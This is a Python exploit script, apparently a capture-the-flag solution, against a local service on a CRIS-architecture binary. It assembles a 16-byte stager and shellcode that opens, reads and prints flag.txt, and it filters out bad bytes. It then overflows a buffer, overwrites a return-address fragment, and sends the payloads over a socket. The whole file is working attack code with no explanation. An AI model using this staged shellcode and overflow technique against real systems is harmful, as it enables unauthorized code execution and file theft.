stager_asm = '''.section .text
.global _start
.ascii "%s"
_start:
read:
    move.d r0, r10
    move.d pc, r11
    addq 12, r11
    moveq 31,r12
    addq 31, r12
    moveq 3,r9
    break 13
    nop
.ascii "%s"
'''
asm = '''.section .text
.global _start

.ascii "%s"
_start:
    move.d pc, r0
    addq 30, r0
open:
    move.d r0, r10
    clear.d r11
    clear.d r12
    moveq 5,r9
    break 13
read:
    move.d r0, r11
    moveq 31,r12
    moveq 3,r9
    break 13
write:
    moveq 0x1, r10
    move.d r0, r11
    moveq 31, r12
    moveq 4,r9
    break 13
.ascii "%s"
  '''
import os
from lib.mylib import *

ARCH = 'cris'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'
BUF_SIZE = 16

stager_asm = stager_asm % (BEGIN_MARKER, END_MARKER)
asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/b.S', mode='wb').write(stager_asm)
os.system(AS + ' /tmp/b.S -o /tmp/b.out')
exe = open('/tmp/b.out').read()
stager = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
xxd(stager)
if '\x00' in stager:
    raise Exception('has \\x00')
if '\x0a' in stager:
    raise Exception('has \\x0a')
if len(stager) > BUF_SIZE:
    raise Exception('too long')
stager = stager.ljust(BUF_SIZE, 'A')

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10005
s = mysock(IP, PORT)

SP = 0x1af8
sl(s, '\n000')
first = stager + p(SP)[0:2] + '\n'
sl(s, first)
sl(s, shellcode)

shell(s)
